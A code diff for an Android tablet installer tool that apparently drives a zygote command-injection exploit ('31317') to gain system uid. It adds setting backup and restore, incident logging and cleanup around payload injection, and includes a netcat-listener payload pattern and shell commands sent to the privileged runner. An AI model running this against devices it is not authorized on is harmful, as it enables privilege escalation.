@@ -7,6 +7,7 @@
 #include <arpa/inet.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <limits.h>
 #include <signal.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -16,6 +17,7 @@
 #include <sys/stat.h>
 #include <sys/un.h>
 #include <sys/wait.h>
+#include <time.h>
 #include <unistd.h>
 
 extern const unsigned char xpad_dex_start[];
@@ -44,8 +46,36 @@ extern const unsigned char xpad_anchor_end[];
 #define PRIMARY_TRIGGER_ACTIVITY "com.android.settings/.Settings"
 #define SECONDARY_TRIGGER_PACKAGE "com.tal.init.ota"
 #define SECONDARY_TRIGGER_ACTIVITY "com.tal.init.ota/.MainActivity"
+#define INCIDENT_ROOT "/data/local/tmp/.xpad-installer"
+#define INCIDENT_LOG_DIR INCIDENT_ROOT "/logs"
+#define HIDDEN_SETTING_BACKUP INCIDENT_ROOT "/hidden-setting-original"
+#define CIRCUIT_BREAKER INCIDENT_ROOT "/31317-circuit-breaker-boot-id"
+
+#ifndef XPAD_INSTALL_VERSION
+#define XPAD_INSTALL_VERSION "development"
+#endif
 
 static volatile sig_atomic_t guarded_child = -1;
+static int incident_fd = -1;
+static char incident_path[PATH_MAX];
+
+struct core_state {
+  char boot_id[80];
+  pid_t zygote64;
+  pid_t zygote32;
+  pid_t system_server;
+  pid_t system_ui;
+};
+
+struct hidden_setting_guard {
+  char *original;
+  size_t original_len;
+  int original_missing;
+  int captured;
+};
+
+static struct core_state incident_baseline;
+static struct hidden_setting_guard hidden_guard;
 
 static void forward_guarded_signal(int signal_number) {
   pid_t child = (pid_t)guarded_child;
@@ -69,6 +99,7 @@ static int write_file(const char *path, const void *data, size_t len, mode_t mod
   if (fd < 0) return -1;
   int rc = write_all(fd, data, len);
   if (fchmod(fd, mode) != 0) rc = -1;
+  if (fsync(fd) != 0) rc = -1;
   if (close(fd) != 0) rc = -1;
   return rc;
 }
@@ -266,6 +297,317 @@ static int settings_set_global(const char *name, const char *value, int missing)
   return run_command(argv);
 }
 
+static int settings_get_global_exact(char **value, size_t *length, int *missing) {
+  char *const argv[] = {
+    "/system/bin/settings", "get", "global", HIDDEN_SETTING, NULL
+  };
+  char *output = NULL;
+  int rc = capture_command(argv, &output);
+  if (rc != 0) {
+    free(output);
+    return rc;
+  }
+  size_t len = strlen(output);
+  /* settings(1) appends exactly one line feed; preserve every byte in the value. */
+  if (len && output[len - 1] == '\n') output[--len] = 0;
+  *missing = len == 0 || (len == 4 && !memcmp(output, "null", 4));
+  if (*missing) {
+    output[0] = 0;
+    len = 0;
+  }
+  *value = output;
+  *length = len;
+  return 0;
+}
+
+static int ensure_incident_directories(void) {
+  if (mkdir(INCIDENT_ROOT, 0700) != 0 && errno != EEXIST) return -1;
+  if (chmod(INCIDENT_ROOT, 0700) != 0) return -1;
+  if (mkdir(INCIDENT_LOG_DIR, 0700) != 0 && errno != EEXIST) return -1;
+  return chmod(INCIDENT_LOG_DIR, 0700);
+}
+
+static int sync_incident_root(void) {
+  int fd = open(INCIDENT_ROOT, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+  if (fd < 0) return -1;
+  int rc = fsync(fd);
+  close(fd);
+  return rc;
+}
+
+static int persist_hidden_guard(const struct hidden_setting_guard *guard) {
+  if (ensure_incident_directories() != 0) return -1;
+  size_t size = guard->original_len + 1;
+  unsigned char *content = malloc(size);
+  if (!content) return -1;
+  content[0] = guard->original_missing ? 'M' : 'P';
+  if (guard->original_len)
+    memcpy(content + 1, guard->original, guard->original_len);
+  char temporary[PATH_MAX];
+  snprintf(temporary, sizeof(temporary), "%s.tmp.%d", HIDDEN_SETTING_BACKUP, getpid());
+  int rc = write_file(temporary, content, size, 0600);
+  free(content);
+  if (rc == 0 && rename(temporary, HIDDEN_SETTING_BACKUP) != 0) rc = -1;
+  if (rc == 0 && sync_incident_root() != 0) rc = -1;
+  if (rc != 0) unlink(temporary);
+  return rc;
+}
+
+static int load_hidden_guard(struct hidden_setting_guard *guard) {
+  memset(guard, 0, sizeof(*guard));
+  int fd = open(HIDDEN_SETTING_BACKUP, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) return errno == ENOENT ? 1 : -1;
+  struct stat st;
+  if (fstat(fd, &st) != 0 || st.st_size < 1 || st.st_size > 1024 * 1024) {
+    close(fd);
+    return -1;
+  }
+  size_t size = (size_t)st.st_size;
+  unsigned char *content = malloc(size + 1);
+  if (!content) {
+    close(fd);
+    return -1;
+  }
+  size_t used = 0;
+  while (used < size) {
+    ssize_t count = read(fd, content + used, size - used);
+    if (count < 0 && errno == EINTR) continue;
+    if (count <= 0) break;
+    used += (size_t)count;
+  }
+  close(fd);
+  if (used != size || (content[0] != 'M' && content[0] != 'P')) {
+    free(content);
+    return -1;
+  }
+  size_t value_len = size - 1;
+  char *value = malloc(value_len + 1);
+  if (!value) {
+    free(content);
+    return -1;
+  }
+  if (value_len) memcpy(value, content + 1, value_len);
+  value[value_len] = 0;
+  guard->original = value;
+  guard->original_len = value_len;
+  guard->original_missing = content[0] == 'M';
+  guard->captured = 1;
+  free(content);
+  return 0;
+}
+
+static int apply_hidden_guard(const struct hidden_setting_guard *guard) {
+  if (!guard->captured) return -1;
+  int rc = settings_set_global(HIDDEN_SETTING, guard->original,
+                               guard->original_missing);
+  char *verified = NULL;
+  size_t verified_len = 0;
+  int verified_missing = 0;
+  if (rc == 0)
+    rc = settings_get_global_exact(&verified, &verified_len, &verified_missing);
+  if (rc == 0 && (verified_missing != guard->original_missing ||
+      verified_len != guard->original_len ||
+      (!verified_missing && memcmp(verified, guard->original, verified_len)))) rc = 1;
+  free(verified);
+  return rc;
+}
+
+static void clear_hidden_guard(struct hidden_setting_guard *guard, int remove_backup) {
+  free(guard->original);
+  memset(guard, 0, sizeof(*guard));
+  if (remove_backup) unlink(HIDDEN_SETTING_BACKUP);
+}
+
+static int restore_persisted_hidden_setting(void) {
+  struct hidden_setting_guard persisted;
+  int loaded = load_hidden_guard(&persisted);
+  if (loaded != 0) return loaded;
+  int rc = apply_hidden_guard(&persisted);
+  clear_hidden_guard(&persisted, rc == 0);
+  return rc == 0 ? 0 : -1;
+}
+
+static int capture_hidden_guard(void) {
+  clear_hidden_guard(&hidden_guard, 0);
+  int stale = restore_persisted_hidden_setting();
+  if (stale < 0) return -1;
+  if (settings_get_global_exact(&hidden_guard.original, &hidden_guard.original_len,
+                                &hidden_guard.original_missing) != 0) return -1;
+  hidden_guard.captured = 1;
+  if (persist_hidden_guard(&hidden_guard) != 0) {
+    clear_hidden_guard(&hidden_guard, 0);
+    return -1;
+  }
+  return 0;
+}
+
+static int finish_hidden_guard(void) {
+  int rc = apply_hidden_guard(&hidden_guard);
+  clear_hidden_guard(&hidden_guard, rc == 0);
+  return rc;
+}
+
+static int hidden_value_is_31317_payload(const char *value, size_t length) {
+  return value && length > ZYGOTE_WRITER_SIZE && value[0] == '\n' &&
+      strstr(value, "--setuid=1000") &&
+      strstr(value, "toybox nc -s 127.0.0.1 -p 8888");
+}
+
+static int remove_recognized_payload(void) {
+  char *current = NULL;
+  size_t current_len = 0;
+  int current_missing = 1;
+  int rc = settings_get_global_exact(&current, &current_len, &current_missing);
+  int recognized = rc == 0 && !current_missing &&
+      hidden_value_is_31317_payload(current, current_len);
+  free(current);
+  if (rc != 0) return -1;
+  if (!recognized) return 1;
+  if (settings_set_global(HIDDEN_SETTING, "", 1) != 0) return -1;
+  char *verified = NULL;
+  size_t verified_len = 0;
+  int verified_missing = 0;
+  rc = settings_get_global_exact(&verified, &verified_len, &verified_missing);
+  free(verified);
+  return rc == 0 && verified_missing ? 0 : -1;
+}
+
+static pid_t pid_for_name(const char *name) {
+  char *output = NULL;
+  char *const argv[] = {"/system/bin/pidof", (char *)name, NULL};
+  int rc = capture_command(argv, &output);
+  if (rc != 0 || !output) {
+    free(output);
+    return -1;
+  }
+  trim_output(output);
+  char *end = NULL;
+  long value = strtol(output, &end, 10);
+  int valid = end && end != output && value > 0;
+  free(output);
+  return valid ? (pid_t)value : -1;
+}
+
+static void read_boot_id(char *output, size_t capacity) {
+  output[0] = 0;
+  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) return;
+  ssize_t count = read(fd, output, capacity - 1);
+  close(fd);
+  if (count <= 0) return;
+  output[count] = 0;
+  trim_output(output);
+}
+
+static void capture_core_state(struct core_state *state) {
+  memset(state, 0, sizeof(*state));
+  read_boot_id(state->boot_id, sizeof(state->boot_id));
+  state->zygote64 = pid_for_name("zygote64");
+  state->zygote32 = pid_for_name("zygote");
+  state->system_server = pid_for_name("system_server");
+  state->system_ui = pid_for_name("com.android.systemui");
+}
+
+static int circuit_breaker_active(void) {
+  char current[80];
+  read_boot_id(current, sizeof(current));
+  int fd = open(CIRCUIT_BREAKER, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) return 0;
+  char saved[80] = {0};
+  ssize_t count = read(fd, saved, sizeof(saved) - 1);
+  close(fd);
+  if (count > 0) {
+    saved[count] = 0;
+    trim_output(saved);
+  }
+  if (*current && !strcmp(current, saved)) return 1;
+  unlink(CIRCUIT_BREAKER);
+  return 0;
+}
+
+static void trip_circuit_breaker(void) {
+  char boot_id[80];
+  read_boot_id(boot_id, sizeof(boot_id));
+  if (!*boot_id || ensure_incident_directories() != 0) return;
+  write_file(CIRCUIT_BREAKER, boot_id, strlen(boot_id), 0600);
+}
+
+static int core_state_changed(const struct core_state *before,
+                              const struct core_state *after) {
+  return strcmp(before->boot_id, after->boot_id) ||
+      before->zygote64 != after->zygote64 ||
+      before->zygote32 != after->zygote32 ||
+      before->system_server != after->system_server ||
+      before->system_ui != after->system_ui;
+}
+
+static long long monotonic_millis(void) {
+  struct timespec now;
+  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) return -1;
+  return (long long)now.tv_sec * 1000 + now.tv_nsec / 1000000;
+}
+
+static int incident_open(void) {
+  if (ensure_incident_directories() != 0) return -1;
+  snprintf(incident_path, sizeof(incident_path), "%s/31317-%lld-%d.jsonl",
+           INCIDENT_LOG_DIR, (long long)time(NULL), getpid());
+  incident_fd = open(incident_path,
+      O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
+  if (incident_fd < 0) return -1;
+  capture_core_state(&incident_baseline);
+  fprintf(stderr, "xpad-install: 31317 incident log=%s\n", incident_path);
+  return 0;
+}
+
+static void incident_event(const char *stage, int attempt, const char *result) {
+  if (incident_fd < 0) return;
+  struct core_state current;
+  capture_core_state(&current);
+  char *hidden = NULL;
+  size_t hidden_len = 0;
+  int hidden_missing = 1;
+  size_t newline_count = 0;
+  if (settings_get_global_exact(&hidden, &hidden_len, &hidden_missing) == 0)
+    for (size_t i = 0; i < hidden_len; i++)
+      if (hidden[i] == '\n') newline_count++;
+  dprintf(incident_fd,
+      "{\"ts\":%lld,\"monotonic_ms\":%lld,\"event\":\"%s\","
+      "\"attempt\":%d,\"result\":\"%s\",\"boot_id\":\"%s\","
+      "\"zygote64\":%d,\"zygote32\":%d,\"system_server\":%d,"
+      "\"system_ui\":%d,\"baseline_boot_id\":\"%s\","
+      "\"baseline_zygote64\":%d,\"baseline_zygote32\":%d,"
+      "\"baseline_system_server\":%d,\"baseline_system_ui\":%d,"
+      "\"hidden_state\":\"%s\",\"hidden_length\":%zu,"
+      "\"hidden_newlines\":%zu}\n",
+      (long long)time(NULL), monotonic_millis(), stage, attempt, result,
+      current.boot_id, current.zygote64, current.zygote32,
+      current.system_server, current.system_ui, incident_baseline.boot_id,
+      incident_baseline.zygote64, incident_baseline.zygote32,
+      incident_baseline.system_server, incident_baseline.system_ui,
+      hidden_missing ? "missing" : "present", hidden_len, newline_count);
+  fsync(incident_fd);
+  free(hidden);
+}
+
+static int incident_core_check(const char *stage, int attempt) {
+  struct core_state current;
+  capture_core_state(&current);
+  if (!core_state_changed(&incident_baseline, &current)) return 0;
+  trip_circuit_breaker();
+  incident_event(stage, attempt, "core-pid-changed");
+  fprintf(stderr,
+          "xpad-install: core process changed during 31317; ordinary reboot required\n");
+  return 75;
+}
+
+static void incident_close(void) {
+  if (incident_fd >= 0) {
+    fsync(incident_fd);
+    close(incident_fd);
+  }
+  incident_fd = -1;
+}
+
 static int prepare_whitelist(const char *package_name, struct whitelist_guard *guard) {
   memset(guard, 0, sizeof(*guard));
   int rc = settings_get_global(INSTALL_WHITELIST, &guard->original,
@@ -433,6 +775,20 @@ static int settings_put(const char *payload) {
   return wait_command(spawn_command(argv, 1));
 }
 
+static int settings_put_verified(const char *payload) {
+  int rc = settings_put(payload);
+  char *current = NULL;
+  size_t current_len = 0;
+  int current_missing = 1;
+  if (rc == 0)
+    rc = settings_get_global_exact(&current, &current_len, &current_missing);
+  size_t payload_len = strlen(payload);
+  if (rc == 0 && (current_missing || current_len != payload_len ||
+                  memcmp(current, payload, payload_len))) rc = 1;
+  free(current);
+  return rc;
+}
+
 static void force_stop_package(const char *package_name) {
   char *const argv[] = {
     "/system/bin/am", "force-stop", (char *)package_name, NULL
@@ -455,19 +811,12 @@ static void start_alignment_triggers(void) {
           primary_status, secondary_status);
 }
 
-static void cleanup_31317(void) {
-  char *const argv[] = {
-    "/system/bin/settings", "delete", "global", HIDDEN_SETTING, NULL
-  };
-  wait_command(spawn_command(argv, 1));
-}
-
 static void cleanup_system_runner(void) {
   int fd = connect_tcp(ZYGOTE_PORT);
   if (fd < 0) return;
   const char command[] =
       "ME=$$; PARENT=$PPID; GP=$(awk '/^PPid:/ {print $2}' /proc/$PARENT/status 2>/dev/null); "
-      "rm -f " SYSTEM_DEX "; settings delete global " HIDDEN_SETTING " >/dev/null 2>&1; "
+      "rm -f " SYSTEM_DEX " " SYSTEM_APK " " SYSTEM_DEX ".pid " SYSTEM_APK ".pid; "
       "kill -9 $GP $PARENT >/dev/null 2>&1\n";
   write_all(fd, command, sizeof(command) - 1);
   shutdown(fd, SHUT_WR);
@@ -475,38 +824,175 @@ static void cleanup_system_runner(void) {
   sleep(1);
 }
 
+static int abort_31317_acquire(const char *stage, int attempt, int rc) {
+  int restore_rc = hidden_guard.captured ? finish_hidden_guard() : 0;
+  if (restore_rc != 0) {
+    remove_recognized_payload();
+    trip_circuit_breaker();
+    rc = 75;
+    incident_event("hidden-setting-restore", attempt, "failed");
+    fprintf(stderr,
+            "xpad-install: exact hidden setting restore failed; ordinary reboot required\n");
+  } else {
+    incident_event("hidden-setting-restore", attempt, "restored");
+  }
+  cleanup_system_runner();
+  force_stop_package(PRIMARY_TRIGGER_PACKAGE);
+  force_stop_package(SECONDARY_TRIGGER_PACKAGE);
+  if (incident_core_check("abort-core-check", attempt) == 75) rc = 75;
+  incident_event(stage, attempt, rc == 75 ? "reboot-required" : "failed");
+  incident_close();
+  return rc;
+}
+
 static int acquire_31317(void) {
+  if (circuit_breaker_active()) {
+    fprintf(stderr,
+            "xpad-install: 31317 circuit breaker is active for this boot; ordinary reboot required\n");
+    if (incident_open() == 0) {
+      incident_event("circuit-breaker", 0, "reboot-required");
+      incident_close();
+    }
+    return 75;
+  }
+  if (incident_open() != 0) {
+    fprintf(stderr, "xpad-install: cannot create durable 31317 incident log\n");
+    return 77;
+  }
+  incident_event("transaction-begin", 0, "running");
+
   int existing = connect_tcp(ZYGOTE_PORT);
-  if (existing >= 0) { close(existing); return 0; }
+  if (existing >= 0) {
+    close(existing);
+    int restored = restore_persisted_hidden_setting();
+    if (restored < 0) {
+      remove_recognized_payload();
+      trip_circuit_breaker();
+      incident_event("existing-listener", 0, "restore-failed");
+      cleanup_system_runner();
+      incident_close();
+      return 75;
+    }
+    incident_event("existing-listener", 0,
+                   restored == 0 ? "setting-restored" : "reused");
+    if (incident_core_check("existing-listener-core-check", 0) == 75) {
+      cleanup_system_runner();
+      incident_close();
+      return 75;
+    }
+    return 0;
+  }
+  if (capture_hidden_guard() != 0) {
+    incident_event("hidden-setting-capture", 0, "failed");
+    incident_close();
+    return 77;
+  }
+  incident_event("hidden-setting-capture", 0,
+                 hidden_guard.original_missing ? "missing" : "present");
+  if (incident_core_check("capture-core-check", 0) == 75)
+    return abort_31317_acquire("transaction-abort", 0, 75);
+
   char *payload = build_zygote_payload();
-  if (!payload) return -1;
+  if (!payload) return abort_31317_acquire("payload-build", 0, 77);
   for (int attempt = 1; attempt <= 3; attempt++) {
-    cleanup_31317();
+    if (apply_hidden_guard(&hidden_guard) != 0) {
+      free(payload);
+      return abort_31317_acquire("attempt-restore", attempt, 75);
+    }
+    incident_event("attempt-begin", attempt, "running");
+    if (incident_core_check("attempt-begin-core-check", attempt) == 75) {
+      free(payload);
+      return abort_31317_acquire("transaction-abort", attempt, 75);
+    }
     force_stop_package(PRIMARY_TRIGGER_PACKAGE);
     force_stop_package(SECONDARY_TRIGGER_PACKAGE);
-    if (settings_put(payload) != 0) {
-      cleanup_31317();
+    incident_event("alignment-force-stop", attempt, "complete");
+    if (incident_core_check("force-stop-core-check", attempt) == 75) {
       free(payload);
-      return -1;
+      return abort_31317_acquire("transaction-abort", attempt, 75);
+    }
+    if (settings_put_verified(payload) != 0) {
+      incident_event("payload-write", attempt, "failed");
+      free(payload);
+      return abort_31317_acquire("transaction-abort", attempt, 77);
+    }
+    incident_event("payload-write", attempt, "verified");
+    if (incident_core_check("payload-core-check", attempt) == 75) {
+      free(payload);
+      return abort_31317_acquire("transaction-abort", attempt, 75);
     }
     start_alignment_triggers();
+    incident_event("alignment-triggers", attempt, "complete");
+    if (incident_core_check("trigger-core-check", attempt) == 75) {
+      free(payload);
+      return abort_31317_acquire("transaction-abort", attempt, 75);
+    }
     for (int i = 0; i < 12; i++) {
+      if (incident_core_check("listener-poll-core-check", attempt) == 75) {
+        free(payload);
+        return abort_31317_acquire("transaction-abort", attempt, 75);
+      }
       int fd = connect_tcp(ZYGOTE_PORT);
       if (fd >= 0) {
         close(fd);
-        cleanup_31317();
+        incident_event("listener-ready", attempt, "connected");
+        if (finish_hidden_guard() != 0) {
+          incident_event("hidden-setting-restore", attempt, "failed");
+          remove_recognized_payload();
+          trip_circuit_breaker();
+          cleanup_system_runner();
+          free(payload);
+          incident_close();
+          fprintf(stderr,
+                  "xpad-install: exact hidden setting restore failed; ordinary reboot required\n");
+          return 75;
+        }
+        incident_event("hidden-setting-restore", attempt, "restored");
         force_stop_package(PRIMARY_TRIGGER_PACKAGE);
         force_stop_package(SECONDARY_TRIGGER_PACKAGE);
         free(payload);
+        if (incident_core_check("listener-ready-core-check", attempt) == 75) {
+          cleanup_system_runner();
+          incident_close();
+          return 75;
+        }
         return 0;
       }
       sleep(1);
     }
     fprintf(stderr, "xpad-install: 31317 attempt %d failed\n", attempt);
+    incident_event("attempt-end", attempt, "listener-missing");
+    if (apply_hidden_guard(&hidden_guard) != 0) {
+      free(payload);
+      return abort_31317_acquire("attempt-restore", attempt, 75);
+    }
+    incident_event("hidden-setting-restore", attempt, "restored");
+    if (incident_core_check("attempt-end-core-check", attempt) == 75) {
+      free(payload);
+      return abort_31317_acquire("transaction-abort", attempt, 75);
+    }
   }
-  cleanup_31317();
   free(payload);
-  return -1;
+  return abort_31317_acquire("transaction-exhausted", 3, 77);
+}
+
+static int finish_31317_transaction(const char *stage, int rc) {
+  incident_event(stage, 0, rc == 0 ? "complete" : "failed");
+  cleanup_system_runner();
+  int restore_rc = restore_persisted_hidden_setting();
+  if (restore_rc < 0) {
+    remove_recognized_payload();
+    trip_circuit_breaker();
+    rc = 75;
+    incident_event("final-hidden-setting-restore", 0, "failed");
+  } else if (restore_rc == 0) {
+    incident_event("final-hidden-setting-restore", 0, "restored");
+  }
+  if (incident_core_check("transaction-final-core-check", 0) == 75) rc = 75;
+  incident_event("transaction-end", 0,
+                 rc == 75 ? "reboot-required" : rc == 0 ? "succeeded" : "failed");
+  incident_close();
+  return rc;
 }
 
 static int transfer_dex_to_system(void) {
@@ -776,22 +1262,21 @@ static int activate_as_system(int argc, char **argv) {
   const char *starter, *apk;
   int rc = parse_service_args(argc, argv, &starter, &apk);
   if (rc != 0) return rc;
-  if (acquire_31317() != 0) return 77;
+  int acquire_rc = acquire_31317();
+  if (acquire_rc != 0) return acquire_rc == 75 ? 75 : 77;
 
   char quoted_starter[4096], apk_arg[2048], quoted_apk[4096], command[8192];
   if (snprintf(apk_arg, sizeof(apk_arg), "--apk=%s", apk) >= (int)sizeof(apk_arg)) {
-    cleanup_system_runner();
-    cleanup_31317();
-    return 64;
+    return finish_31317_transaction("activate-arguments", 64);
   }
   shell_quote(quoted_starter, sizeof(quoted_starter), starter);
   shell_quote(quoted_apk, sizeof(quoted_apk), apk_arg);
   snprintf(command, sizeof(command), "%s %s", quoted_starter, quoted_apk);
   fprintf(stderr, "xpad-install: activating BoomInstaller as uid 1000 (31317)\n");
   rc = rpc(command, 60);
-  cleanup_system_runner();
-  cleanup_31317();
-  return rc;
+  incident_event("activate-rpc", 0, rc == 0 ? "complete" : "failed");
+  if (incident_core_check("activate-core-check", 0) == 75) rc = 75;
+  return finish_31317_transaction("activate-complete", rc);
 }
 
 static int ionstack_root_java(int argc, char **argv) {
@@ -855,11 +1340,144 @@ static int ionstack_delegate(int argc, char **argv) {
   return marker ? atoi(marker + strlen("__XPAD_IONSTACK_RC__")) : 125;
 }
 
+static int native_self_test(void) {
+  size_t dex_size = (size_t)(xpad_dex_end - xpad_dex_start);
+  size_t anchor_size = (size_t)(xpad_anchor_end - xpad_anchor_start);
+  int valid = dex_size >= 8 && !memcmp(xpad_dex_start, "dex\n", 4) &&
+      anchor_size >= 4 && !memcmp(xpad_anchor_start, "PK\003\004", 4);
+  printf("XPAD_INSTALL_SELF_TEST status=%s version=%s dex_size=%zu anchor_size=%zu\n",
+         valid ? "ok" : "failed", XPAD_INSTALL_VERSION, dex_size, anchor_size);
+  return valid ? 0 : 1;
+}
+
+static int native_doctor(void) {
+  int self_test = native_self_test();
+  char context[256] = "unavailable";
+  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
+  if (fd >= 0) {
+    ssize_t count = read(fd, context, sizeof(context) - 1);
+    close(fd);
+    if (count > 0) {
+      context[count] = 0;
+      trim_output(context);
+    }
+  }
+  printf("uid=%d\n", getuid());
+  puts("transport=none");
+  printf("selinux=%s\n", context);
+  printf("provider=%s\n",
+         access("/system/app/pad2_znxxservice/pad2_znxxservice.apk", R_OK) == 0
+             ? "available" : "missing");
+  znxrun_status(1);
+  puts("31317=not-probed");
+  return self_test;
+}
+
+static const char *dump_value(const char *dump, const char *name,
+                              char *value, size_t capacity) {
+  const char *found = strstr(dump, name);
+  if (!found) return NULL;
+  found += strlen(name);
+  size_t used = 0;
+  while (found[used] && found[used] != '\n' && found[used] != '\r' &&
+         found[used] != ' ' && found[used] != '\t' && used + 1 < capacity) {
+    value[used] = found[used];
+    used++;
+  }
+  value[used] = 0;
+  return value;
+}
+
+static int native_verify(int argc, char **argv) {
+  if (argc < 3 || argc > 4) {
+    fprintf(stderr, "xpad-install: verify requires PACKAGE [VERSION_CODE]\n");
+    return 64;
+  }
+  long long minimum = 0;
+  if (argc == 4) {
+    char *end = NULL;
+    errno = 0;
+    minimum = strtoll(argv[3], &end, 10);
+    if (errno || !end || *end || minimum < 0) {
+      fprintf(stderr, "xpad-install: invalid VERSION_CODE: %s\n", argv[3]);
+      return 64;
+    }
+  }
+  char *dump = NULL;
+  char *const command[] = {
+    "/system/bin/dumpsys", "package", argv[2], NULL
+  };
+  int command_rc = capture_command(command, &dump);
+  char marker[512];
+  snprintf(marker, sizeof(marker), "Package [%s]", argv[2]);
+  if (command_rc != 0 || !dump || !strstr(dump, marker)) {
+    printf("[-] package missing: %s\n", argv[2]);
+    free(dump);
+    return 1;
+  }
+  char version_text[64], installer[256];
+  const char *package_dump = strstr(dump, marker);
+  const char *version = dump_value(package_dump, "versionCode=", version_text,
+                                   sizeof(version_text));
+  const char *source = dump_value(package_dump, "installerPackageName=", installer,
+                                  sizeof(installer));
+  char *end = NULL;
+  errno = 0;
+  long long actual = version ? strtoll(version, &end, 10) : -1;
+  int version_valid = version && !errno && end && end != version &&
+      (*end == 0 || *end == ' ');
+  printf("package=%s\n", argv[2]);
+  printf("versionCode=%lld\n", version_valid ? actual : -1);
+  printf("installer=%s\n", source && *source ? source : "null");
+  free(dump);
+  return version_valid && actual >= minimum && source &&
+      !strcmp(source, OEM_INSTALLER) ? 0 : 1;
+}
+
+static int native_cleanup(void) {
+  int needs_reboot = circuit_breaker_active();
+  int restored = restore_persisted_hidden_setting();
+  if (restored < 0) {
+    fprintf(stderr,
+            "xpad-install: saved hidden setting could not be restored exactly\n");
+    remove_recognized_payload();
+    needs_reboot = 1;
+  } else if (restored == 0) {
+    puts("hidden-setting=restored");
+  } else {
+    int removed = remove_recognized_payload();
+    if (removed < 0) {
+      needs_reboot = 1;
+    } else if (removed == 0) {
+      puts("hidden-setting=removed-stale-payload");
+    }
+  }
+
+  int listener = connect_tcp(ZYGOTE_PORT);
+  if (listener >= 0) {
+    close(listener);
+    cleanup_system_runner();
+  }
+  listener = connect_tcp(ZYGOTE_PORT);
+  if (listener >= 0) {
+    close(listener);
+    fprintf(stderr, "xpad-install: temporary system runner is still reachable\n");
+    needs_reboot = 1;
+  }
+  unlink(ROOT_DEX);
+  unlink(ZNXRUN_APK);
+  unlink(ANCHOR_APK);
+  unlink("/data/local/tmp/.xpad-installer.apk");
+  puts(needs_reboot ? "cleanup=reboot-required" : "cleanup=complete");
+  return needs_reboot ? 75 : 0;
+}
+
 static void usage(FILE *out) {
   fprintf(out,
       "xpad-install - single-file OEM APK installer for authorized XPad2 devices\n"
       "\n"
       "Usage:\n"
+      "  xpad-install self-test\n"
       "  xpad-install doctor\n"
       "  xpad-install install [--backend auto|provider|direct] APK\n"
       "  xpad-install upgrade [--backend auto|provider|direct] APK\n"
@@ -901,14 +1519,33 @@ static void usage(FILE *out) {
 }
 
 static int system_transport(int argc, char **argv) {
-  if (acquire_31317() != 0) return 77;
+  int acquire_rc = acquire_31317();
+  if (acquire_rc != 0) return acquire_rc == 75 ? 75 : 77;
   int rc = 74;
-  if (transfer_dex_to_system() != 0) goto cleanup;
+  if (transfer_dex_to_system() != 0) {
+    incident_event("transfer-dex", 0, "failed");
+    goto cleanup;
+  }
+  incident_event("transfer-dex", 0, "complete");
+  if (incident_core_check("transfer-dex-core-check", 0) == 75) {
+    rc = 75;
+    goto cleanup;
+  }
   int apk_index = apk_arg_index(argc - 1, argv + 1);
   int has_apk = apk_index >= 0;
   int native_apk_index = has_apk ? apk_index + 1 : -1;
   const char *provider_apk = has_apk ? argv[native_apk_index] : NULL;
-  if (has_apk && transfer_apk_to_system(provider_apk) != 0) goto cleanup;
+  if (has_apk && transfer_apk_to_system(provider_apk) != 0) {
+    incident_event("transfer-apk", 0, "failed");
+    goto cleanup;
+  }
+  if (has_apk) {
+    incident_event("transfer-apk", 0, "complete");
+    if (incident_core_check("transfer-apk-core-check", 0) == 75) {
+      rc = 75;
+      goto cleanup;
+    }
+  }
   char command[16384], quoted[2048];
   snprintf(command, sizeof(command),
            "CLASSPATH=%s:/system/app/pad2_znxxservice/pad2_znxxservice.apk "
@@ -925,13 +1562,15 @@ static int system_transport(int argc, char **argv) {
     strlcat(command, " ", sizeof(command)); strlcat(command, quoted, sizeof(command));
   }
   rc = rpc(command, 300);
+  incident_event("java-command", 0, rc == 0 ? "complete" : "failed");
+  if (incident_core_check("java-command-core-check", 0) == 75) rc = 75;
 
 cleanup:
   rpc("for F in " SYSTEM_DEX ".pid " SYSTEM_APK ".pid; do "
       "[ -f \"$F\" ] && kill $(cat \"$F\") 2>/dev/null; done; "
       "rm -f " SYSTEM_DEX " " SYSTEM_APK " " SYSTEM_DEX ".pid " SYSTEM_APK ".pid", 10);
-  cleanup_system_runner();
-  cleanup_31317();
+  rc = finish_31317_transaction("system-transport-complete", rc);
+  if (rc == 75) return rc;
   int verify_znxrun = argc >= 4 && !strcmp(argv[1], "znxrun") &&
       (!strcmp(argv[2], "create") || !strcmp(argv[2], "ensure"));
   for (int i = 3; verify_znxrun && i < argc; i++)
@@ -990,7 +1629,8 @@ static int run_znxrun_mutation(int argc, char **argv, const char *package_name) 
   else rc = 128 + WTERMSIG(status);
   if (rc >= 128) {
     cleanup_system_runner();
-    cleanup_31317();
+    int setting_rc = restore_persisted_hidden_setting();
+    if (setting_rc < 0) rc = 75;
     force_stop_package(PRIMARY_TRIGGER_PACKAGE);
     force_stop_package(SECONDARY_TRIGGER_PACKAGE);
   }
@@ -1046,6 +1686,19 @@ int main(int argc, char **argv) {
     usage(stderr);
     return 64;
   }
+  if (!strcmp(argv[1], "self-test")) {
+    if (argc != 2) { usage(stderr); return 64; }
+    return native_self_test();
+  }
+  if (!strcmp(argv[1], "doctor")) {
+    if (argc != 2) { usage(stderr); return 64; }
+    return native_doctor();
+  }
+  if (!strcmp(argv[1], "verify")) return native_verify(argc, argv);
+  if (!strcmp(argv[1], "cleanup")) {
+    if (argc != 2) { usage(stderr); return 64; }
+    return native_cleanup();
+  }
   if (!strcmp(argv[1], "znxrun") && argc >= 3 && !strcmp(argv[2], "status")) {
     if (argc != 3) { usage(stderr); return 64; }
     return znxrun_status(1);
@@ -1063,7 +1716,6 @@ int main(int argc, char **argv) {
     }
     return run_znxrun_mutation(argc, argv, package_name);
   }
-  if (!strcmp(argv[1], "doctor")) znxrun_status(1);
   if (argc >= 2 && !strcmp(argv[1], "--root-child")) {
     if (argc >= 3 && (!strcmp(argv[2], "activate") || !strcmp(argv[2], "serve"))) {
       return serve(argc - 2, argv + 2);
